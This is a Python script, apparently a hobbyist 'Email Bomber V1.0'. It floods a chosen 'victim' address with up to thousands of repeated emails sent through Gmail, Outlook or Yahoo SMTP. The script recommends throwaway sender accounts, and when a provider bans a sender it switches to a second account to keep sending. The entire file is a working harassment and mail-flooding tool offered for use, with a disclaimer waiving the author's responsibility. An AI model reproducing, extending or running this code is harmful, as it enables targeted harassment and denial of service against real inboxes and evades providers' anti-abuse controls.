import smtplib
import getpass
import sys
import time
import MailBomber_banner
import colorama


class MainProgram:

    def __init__(self):
        print(colorama.Fore.GREEN + "{+}{-} Email Bomber V1.0 {-}{+}")
        print(colorama.Fore.GREEN +
              "{+}{-} Made by Flat_Earth_Gary {-}{+}", end="")
        print(colorama.Fore.YELLOW + MailBomber_banner.Banner())
        print(colorama.Fore.RED + "BY USING THIS PROGRAM YOU TAKE FULL RESPONSIBLILTY FOR YOUR ACTIONS. I CAN NOT BE HELD ACCOUNTABLE FOR ANYTHING YOU USE THIS SOFTWARE FOR.")
        print("If you understand and agree on the conditions press enter. If not press CTRL - C")
        self.count = 0
        try:
            input()
        except KeyboardInterrupt:
            interruption()

        print(colorama.Fore.MAGENTA +
              "FOR MORE INFO ABOUT SENDING MORE MAILS QUICKER type: info")
        print(colorama.Fore.BLUE +
              "If you do not want to see the info press", colorama.Fore.GREEN + "ENTER")
        try:
            info = input("> ")
            info = info.lower()
            if info == "info":
                self.second = second_method()
                self.second.Starting()
                sys.exit(1)
        except KeyboardInterrupt:
            interruption()

    def Main_Setup(self):

        print(colorama.Fore.YELLOW +
              "\n\n{+}{-} Input target mail adress {-}{+}")
        self.victim = str(input("> "))

        print("{+}{-} From mail adress {-}{+} (Note that this is needed to be able to send mails and will NOT be sent to me. I recommend you use a scrap mail)")
        self.from_mail = str(input("> "))
        self.psw = getpass.getpass()

        print("What do you want the subject of the mail to be?")
        try:
            self.subject = str(input("> "))
        except KeyboardInterrupt:
            interruption()

        print("Type in what message you want to be spammed:\n")
        self.message = str(input())
        self.msg = """From: %s\nSubject: %s\nTo/Victim: %s\n%s""" % (
            self.from_mail, self.subject, self.victim, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print("Type a nubmer.")

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            self.amount = int(input("> "))
        else:
            pass

        print(colorama.Fore.GREEN + "\nYou have chosen to send: " +
              str(self.amount) + " mails\n Victim: " + str(self.victim) + "\n Sender mail: " + self.from_mail)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
        except KeyboardInterrupt:
            interruption()

    def Email(self):
        try:
            print(colorama.Fore.YELLOW +
                  "{+}{-} Setting up mail server {-}{+}")
            self.server = str(
                input("Enter premade mailserver | 1: Gmail | 2: Outlook | 3: Yahoo\n> "))
            premade_servers = ["1", "2", "3"]
            if self.server not in premade_servers:
                print("Shutting down...")
                sys.exit(1)
            else:
                pass

            if self.server == "1":
                self.server = "Gmail"
                print("You have chosen the premade option:", self.server)
                self.server = "smtp.gmail.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "2":
                self.server = "Outlook"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp-mail.outlook.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "3":
                self.server = "Yahoo"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp.mail.yahoo.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            else:
                sys.exit(1)

            print("{+}{-} Setting up mail server {-}{+}")
            self.s = smtplib.SMTP(self.server, self.port)
            print(colorama.Fore.GREEN + "Connection successfull")
            print(colorama.Fore.YELLOW + "Checking with ehlo")
            self.s.ehlo()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Successfull")
            print(colorama.Fore.YELLOW + "Encrypting data...")
            self.s.starttls()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Done")
            print(colorama.Fore.YELLOW + "Establishing connection")
            self.s.ehlo()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Done")
            print(colorama.Fore.YELLOW + "Attempting to log in...")
            self.s.login(self.from_mail, self.psw)
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Sucessfully logged in")
            self.BLAST()
        except Exception as e:
            print(colorama.Fore.RED + f"ERROR: {e}")

    def sending_bomb(self):
        try:
            self.s.sendmail(self.from_mail, self.victim, self.msg)
            self.count += 1
            print(colorama.Fore.BLUE +
                  "BOMB SENT NUMBER: " + str(self.count))
        except Exception:
            self.ShadowBanned()

    def BLAST(self):
        print(colorama.Fore.RED + "{+}{-} Initalizing attack {-}{+}")
        for mail in range(self.amount):
            try:
                self.sending_bomb()
                if self.count == self.amount:
                    break
            except Exception and not KeyboardInterrupt as e:
                print(colorama.Fore.RED +
                      f"ERROR DETECTED: {e}")
                print(colorama.Fore.YELLOW +
                      "No need to panick, this is most likely a ban/shadowban on your account. Fix this by assigning a new account.")
                self.ShadowBanned()
            except KeyboardInterrupt:
                interruption()

        self.s.close()
        print(colorama.Fore.GREEN +
              "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (self.amount))
        self.finished()

    def finished(self):
        print(colorama.Fore.GREEN +
              "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (self.amount))
        sys.exit(0)

    def ShadowBanned(self):
        self.from_mail = str(input(
            colorama.Fore.RED + "Input new mail adress (don't bother putting in the same, it most likely won't work): "))
        self.psw = getpass.getpass("Type the password: ")
        print("If you want to start off from the begining (setting up what msg you want and so on) type: ", end="")
        print(colorama.Fore.YELLOW + "restart", end=" ")
        print(colorama.Fore.BLUE + "else press: " +
              colorama.Fore.GREEN + "ENTER")
        t = str(input())
        t = t.lower()
        if t == "restart":
            self.ShadowBanned_setup()
            self.Email()
        else:
            self.Shadow_continue()

    def ShadowBanned_setup(self):
        print("Type in what message you want to be spammed:\n")
        self.message = str(input())
        self.msg = """From: %s\nTo/Victim: %s\n%s""" % (
            self.from_mail,  self.victim, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print("Type a nubmer.")

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            self.amount = int(input("> "))
        else:
            pass

        print(colorama.Fore.GREEN + "\nYou have chosen to send: " +
              str(self.amount) + " mails\n Victim: " + str(self.victim) + "\n Sender mail: " + self.from_mail)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
        except KeyboardInterrupt:
            interruption()

    def Shadow_continue(self):
        try:
            print("{+}{-} Setting up mail server {-}{+}")
            self.s = smtplib.SMTP(self.server, self.port)
            print(colorama.Fore.GREEN + "Connection successfull")
            print(colorama.Fore.YELLOW + "Checking with ehlo")
            self.s.ehlo()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Successfull")
            print(colorama.Fore.YELLOW + "Encrypting data...")
            self.s.starttls()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Done")
            print(colorama.Fore.YELLOW + "Establishing connection")
            self.s.ehlo()
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Done")
            try:
                print(colorama.Fore.YELLOW + "Attempting to log in...")
                self.s.login(self.from_mail, self.psw)
            except Exception:
                print(colorama.Fore.RED + "Login unsuccessfull")
                print(
                    "Restart the program and be sure you type in the corret mail adress and password.")
                sys.exit(1)
            time.sleep(0.1)
            print(colorama.Fore.GREEN + "Sucessfully logged in")
            self.BLAST()
        except Exception:
            pass


class second_method(MainProgram):

    def __init__(self):
        self.count = 0
        self.mail = ""
        self.psw = ""
        print(colorama.Fore.MAGENTA + "THIS VERSION OF THE MAILBOMBER IS NOT STABLE AT THE TIME. IF YOU WANT A FULLY WORKING MAIL BOMBER RESTART THE PROGRAM AND USE THE SECOND VERSION.")
        print("If you want to proceed, press: ", colorama.Fore.GREEN + "ENTER")
        input()
        try:
            print("What is your first mailadress?")
            self.mail_1 = str(input("> "))
            self.mail_1_psw = getpass.getpass()
            print("What is your second mailadress?")
            self.mail_2 = str(input("> "))
            self.mail_2_psw = getpass.getpass()
        except KeyboardInterrupt:
            interruption()

        print(colorama.Fore.BLUE + "You have chosen: " + colorama.Fore.GREEN +
              str(self.mail_1) + colorama.Fore.BLUE + "; as your first mailadress")
        print("You have chosen: " + colorama.Fore.GREEN + str(self.mail_2) + colorama.Fore.BLUE +
              "; as your second mailadress")
        try:
            print(colorama.Fore.YELLOW + "If this is correct, press: " +
                  colorama.Fore.GREEN + "ENTER" + colorama.Fore.BLUE + "else press CTRL - C")
            input()
        except KeyboardInterrupt:
            interruption()

    def Starting(self):

        print(colorama.Fore.YELLOW +
              "\n\n{+}{-} Input target mail adress {-}{+}")
        self.victim = str(input("> "))
        print("Type in what message you want to be spammed:")
        self.message = str(input())
        print(colorama.Fore.YELLOW + "Type in the subject of the mail:")
        self.subject = str(input(colorama.Fore.GREEN + "> "))
        self.mail = self.mail_1
        self.psw = self.mail_1_psw
        self.msg = """From: %s\nTarget/Victim: %s\nSubject: %s \n%s""" % (
            self.mail, self.victim, self.subject, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print(colorama.Fore.GREEN + "Please type a nummber!.")
            except KeyboardInterrupt:
                interruption()

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            while True:
                try:
                    self.amount = int(input("> "))
                    break
                except ValueError:
                    print("Please provide a nummber!")
                except KeyboardInterrupt:
                    interruption()
                    break
        else:
            pass

        print(colorama.Fore.GREEN + "\nYou have chosen to send: " + colorama.Fore.MAGENTA +
              str(self.amount) + colorama.Fore.GREEN + " mails\n Victim: " + colorama.Fore.MAGENTA + str(self.victim) + colorama.Fore.GREEN + "\n Sender mail: " + colorama.Fore.MAGENTA + self.mail_1 + colorama.Fore.GREEN + "; and as a second mail: " + colorama.Fore.MAGENTA + self.mail_2)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
            self.Execution()
        except KeyboardInterrupt:
            interruption()

    def Execution(self):
        try:
            print(colorama.Fore.YELLOW +
                  "{+}{-} Setting up mail server {-}{+}")
            while True:
                self.server = str(
                    input("Enter premade mailserver | 1: Gmail | 2: Outlook | 3: Yahoo\n> "))
                premade_servers = ["1", "2", "3"]
                if self.server not in premade_servers:
                    print(colorama.Fore.RED + "Not a valid option. " +
                          colorama.Fore.GREEN + "VALID OPTIONS: 1, 2, 3")
                else:
                    break

            if self.server == "1":
                self.server = "Gmail"
                print("You have chosen the premade option:" +
                      colorama.Fore.MAGENTA + self.server)
                self.server = "smtp.gmail.com"
                time.sleep(0.1)
                print(colorama.Fore.GREEN + "Setting up port...")
                self.port = int(587)
            elif self.server == "2":
                self.server = "Outlook"
                print("You have chosen the premade option: " +
                      colorama.Fore.MAGENTA + self.server)
                self.server = "smtp-mail.outlook.com"
                time.sleep(0.1)
                print(colorama.Fore.GREEN + "Setting up port...")
                self.port = int(587)
            elif self.server == "3":
                self.server = "Yahoo"
                print("You have chosen the premade option: " +
                      colorama.Fore.MAGENTA + self.server)
                self.server = "smtp.mail.yahoo.com"
                time.sleep(0.1)
                print(colorama.Fore.GREEN + "Setting up port...")
                self.port = int(587)
            else:
                sys.exit(1)

        except Exception as e:
            print(colorama.Fore.RED + f"ERROR ENCOUNTERED: {e}")
            sys.exit(1)

        print("{+}{-} Setting up mail server {-}{+}")
        self.s = smtplib.SMTP(self.server, self.port)
        print(colorama.Fore.GREEN + "Connection successfull")
        print(colorama.Fore.YELLOW + "Checking with ehlo")
        self.s.ehlo()
        time.sleep(0.1)
        print(colorama.Fore.GREEN + "Successfull")
        print(colorama.Fore.YELLOW + "Encrypting data...")
        self.s.starttls()
        time.sleep(0.1)
        print(colorama.Fore.GREEN + "Done")
        print(colorama.Fore.YELLOW + "Establishing connection")
        self.s.ehlo()
        time.sleep(0.1)
        print(colorama.Fore.GREEN + "Done")
        print(colorama.Fore.YELLOW + "Attempting to log in...")
        self.s.login(self.mail, self.psw)
        time.sleep(0.1)
        print(colorama.Fore.GREEN + "Sucessfully logged in")
        print(colorama.Fore.MAGENTA + "{+}{-} Initalizing attack {-}{+}")
        self.Nagasaki()

    def Nagasaki(self):

        for mail in range(self.amount):
            try:
                self.Nukes()
                if self.count == self.amount:
                    break
            except KeyboardInterrupt:
                interruption()

        self.s.close()
        self.finished()

    def Nukes(self):
        try:
            self.s.sendmail(self.mail, self.victim, self.msg)
            self.count += 1
            print(colorama.Fore.BLUE +
                  "BOMB SENT NUMBER: " + colorama.Fore.MAGENTA + str(self.count))
        except Exception:
            if self.mail == self.mail_1:
                self.mail = self.mail_2
                self.psw = self.mail_2_psw
                self.msg = """From: %s\nTarget/Victim: %s\nSubject: %s \n%s""" % (
                    self.mail, self.victim, self.subject, self.message)
                self.s = smtplib.SMTP(self.server, self.port)
                time.sleep(0.1)
                self.s.ehlo()
                time.sleep(0.1)
                self.s.starttls()
                time.sleep(0.1)
                self.s.ehlo()
                time.sleep(0.1)
                try:
                    self.s.login(self.mail, self.psw)
                except Exception as e:
                    print(colorama.Fore.RED + f"ERROR ENCOUNTERED: " +
                          colorama.Fore.MAGENTA + "{e}")

            elif self.mail == self.mail_2:
                self.mail = self.mail_1
                self.psw = self.mail_1_psw
                self.msg = """From: %s\nTo/Victim: %s\n%s""" % (
                    self.mail, self.victim, self.message)
                self.s.login(self.mail, self.psw)
            self.Nagasaki()


def interruption():
    print(colorama.Fore.RED + "Program interrupted. \nClosing down...")
    sys.exit(1)


Run = MainProgram()
Run.Main_Setup()
Run.Email()
